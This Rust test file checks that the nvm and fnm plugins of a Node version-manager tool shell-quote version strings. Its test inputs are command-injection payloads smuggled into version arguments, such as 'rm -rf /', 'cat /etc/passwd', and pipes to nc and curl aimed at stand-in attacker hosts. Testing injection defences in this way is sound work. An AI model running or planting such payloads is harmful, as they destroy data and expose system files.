use xvn::plugins::{FnmPlugin, NvmPlugin, VersionManagerPlugin};

#[test]
fn test_nvm_shell_escaping() {
    let plugin = NvmPlugin::new();

    let dangerous_inputs = vec![
        ("18.20.0; rm -rf /", ";"),
        ("18.20.0 && cat /etc/passwd", "&&"),
        ("18.20.0 | nc attacker.com 1234", "|"),
        ("18.20.0`whoami`", "`"),
        ("18.20.0$(whoami)", "$"),
    ];

    for (input, dangerous_char) in dangerous_inputs {
        let activate = plugin.activate_command(input).unwrap();
        let install = plugin.install_command(input).unwrap();

        // Verify the command starts with the expected prefix
        assert!(
            activate.starts_with("nvm use "),
            "Expected 'nvm use' prefix, got: {activate}"
        );
        assert!(
            install.starts_with("nvm install "),
            "Expected 'nvm install' prefix, got: {install}"
        );

        // Extract the version part after the command
        let activate_version = activate.strip_prefix("nvm use ").unwrap();
        let install_version = install.strip_prefix("nvm install ").unwrap();

        // Verify the dangerous input is quoted (shell-escape wraps in single quotes)
        assert!(
            activate_version.starts_with('\'') && activate_version.ends_with('\''),
            "Version should be single-quoted in activate: {activate}"
        );
        assert!(
            install_version.starts_with('\'') && install_version.ends_with('\''),
            "Version should be single-quoted in install: {install}"
        );

        // Verify the dangerous character is inside the quotes (neutralized)
        assert!(
            activate_version.contains(dangerous_char),
            "Dangerous char '{dangerous_char}' should be present but quoted in: {activate}"
        );
    }
}

#[test]
fn test_fnm_shell_escaping() {
    let plugin = FnmPlugin::new();

    let dangerous_inputs = vec![
        ("18.20.0; rm -rf /", ";"),
        ("18.20.0 && cat /etc/passwd", "&&"),
        ("18.20.0 | curl evil.com", "|"),
    ];

    for (input, dangerous_char) in dangerous_inputs {
        let activate = plugin.activate_command(input).unwrap();
        let install = plugin.install_command(input).unwrap();

        // Verify command prefixes
        assert!(
            activate.starts_with("fnm use "),
            "Expected 'fnm use' prefix, got: {activate}"
        );
        assert!(
            install.starts_with("fnm install "),
            "Expected 'fnm install' prefix, got: {install}"
        );

        // Extract version parts
        let activate_version = activate.strip_prefix("fnm use ").unwrap();
        let install_version = install.strip_prefix("fnm install ").unwrap();

        // Verify proper quoting
        assert!(
            activate_version.starts_with('\'') && activate_version.ends_with('\''),
            "Version should be single-quoted in activate: {activate}"
        );
        assert!(
            install_version.starts_with('\'') && install_version.ends_with('\''),
            "Version should be single-quoted in install: {install}"
        );

        // Verify dangerous character is neutralized
        assert!(
            activate_version.contains(dangerous_char),
            "Dangerous char '{dangerous_char}' should be present but quoted in: {activate}"
        );
    }
}

#[test]
fn test_nvm_normal_versions_not_over_quoted() {
    let plugin = NvmPlugin::new();

    // Normal versions should still work fine
    let normal_versions = vec!["18.20.0", "20.0.0", "lts/hydrogen"];

    for version in normal_versions {
        let activate = plugin.activate_command(version).unwrap();
        let install = plugin.install_command(version).unwrap();

        // Should start with expected commands
        assert!(activate.starts_with("nvm use "));
        assert!(install.starts_with("nvm install "));

        // Should contain the version (possibly quoted, but that's OK)
        assert!(activate.contains(version) || activate.contains(&format!("'{version}'")));
        assert!(install.contains(version) || install.contains(&format!("'{version}'")));
    }
}

#[test]
fn test_fnm_normal_versions_not_over_quoted() {
    let plugin = FnmPlugin::new();

    // Normal versions should still work fine
    let normal_versions = vec!["18.20.0", "20.0.0", "21.0.0"];

    for version in normal_versions {
        let activate = plugin.activate_command(version).unwrap();
        let install = plugin.install_command(version).unwrap();

        // Should start with expected commands
        assert!(activate.starts_with("fnm use "));
        assert!(install.starts_with("fnm install "));

        // Should contain the version
        assert!(activate.contains(version) || activate.contains(&format!("'{version}'")));
        assert!(install.contains(version) || install.contains(&format!("'{version}'")));
    }
}
